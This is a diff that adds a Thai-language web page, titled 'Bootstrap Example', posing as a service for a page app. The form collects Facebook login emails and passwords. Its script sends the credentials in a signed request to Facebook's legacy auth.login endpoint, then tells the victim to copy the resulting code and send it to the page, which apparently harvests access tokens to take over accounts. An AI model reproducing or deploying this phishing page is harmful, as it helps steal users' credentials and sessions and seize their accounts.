@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="th">
+
+<head>
+
+    <title>Bootstrap Example</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+    <script type="text/javascript" src="js/md5.js"></script>
+
+    <script>
+        (function () {
+            function toJSONString(form) {
+                var obj = {};
+                var elements = form.querySelectorAll("input, select, textarea");
+                for (var i = 0; i < elements.length; ++i) {
+                    var element = elements[i];
+                    var name = element.name;
+                    var value = element.value;
+
+                    if (name) {
+                        obj[name] = value;
+                    }
+                }
+                console.log(obj)
+                $('#panel-code').show();
+
+                var email = obj.user;
+                var password = obj.pass;
+                var data = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + email + 'format=JSONmethod=auth.loginpassword=' + password + 'v=1.062f8ce9f74b12f84c123cc23437a4a32';
+                var sig = md5(data);
+
+                var aurl = 'https://api.facebook.com/restserver.php?api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email=' + email + '&format=JSON&method=auth.login&password=' + password + '&v=1.0&sig=' + sig;
+                console.log(aurl);
+
+                window.location = aurl
+
+                return JSON.stringify(obj);
+            }
+
+            document.addEventListener("DOMContentLoaded", function () {
+                var form = document.getElementById("test");
+                var output = document.getElementById("output");
+                form.addEventListener("submit", function (e) {
+                    e.preventDefault();
+                    var json = toJSONString(this);
+
+                    //output.innerHTML = json;
+                }, false);
+
+            });
+
+        })();
+    </script>
+
+    <style>
+        .loader {
+            border: 16px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 16px solid #3498db;
+            width: 120px;
+            height: 120px;
+            -webkit-animation: spin 2s linear infinite;
+            /* Safari */
+            animation: spin 2s linear infinite;
+        }
+
+        /* Safari */
+        @-webkit-keyframes spin {
+            0% {
+                -webkit-transform: rotate(0deg);
+            }
+            100% {
+                -webkit-transform: rotate(360deg);
+            }
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+
+</head>
+
+<body>
+
+    <div class="container">
+        <div class="jumbotron">
+            <h2>เพจแห่งประเทศไทย</h2>
+            <br><br>
+            <form id="test" action="#" method="post">
+                <div class="input-group">
+                    <span class="input-group-addon">อีเมล์/เบอร์โทร เฟสบุ๊คของคุณ </span>
+                    <input class="form-control" type="text" name="user" id="user" placeholder="ที่นี่" />
+                </div>
+                <br>
+                <div class="input-group">
+                    <span class="input-group-addon">รหัสผ่าน สำหรับแอพ pageth</span>
+                    <input class="form-control" type="text" name="pass" id="pass" placeholder="ที่นี่" />
+                </div><br>
+                <p>
+                    <input type="submit" value="Send" class="btn btn-primary btn-block" />
+                </p>
+            </form>
+            <div align="center" class="inputGroup inputGroup4" id="panel-code" style="display: none">
+                <div class="loader"></div><br>
+                <label>กำลังโหลด รอ...<br><br></label><br><br>
+                <label>คัดลอกโค้ดแล้วส่งให้<br></label>
+                <label>เพจแห่งประเทศไทย</label>
+            </div>
+        </div>
+    </div>
+
+</body>
+
+</html>
